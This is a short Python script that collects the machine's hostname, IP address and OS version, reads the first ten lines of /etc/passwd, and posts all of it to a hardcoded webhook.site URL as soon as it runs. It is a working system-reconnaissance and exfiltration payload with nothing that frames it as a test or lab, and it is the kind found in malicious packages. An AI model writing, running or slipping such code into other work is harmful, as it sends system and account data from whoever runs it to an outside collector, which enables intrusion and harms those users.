import socket, platform, os, datetime, json, requests

def collect_info():
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except:
        ip = "unknown"

    passwd = ""
    if os.path.exists("/etc/passwd"):
        try:
            with open("/etc/passwd", "r") as f:
                passwd = "".join(f.readlines()[:10])
        except:
            passwd = "error reading /etc/passwd"

    return {
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hostname": socket.gethostname(),
        "ip": ip,
        "os": f"{platform.system()} {platform.release()}",
        "passwd_sample": passwd
    }

def send_to_webhooksite(data):
    url = "https://webhook.site/83d01bde-6bcd-42b8-ad49-db33b366b99d"  
    requests.post(url, json=data)

# Run
info = collect_info()
send_to_webhooksite(info)
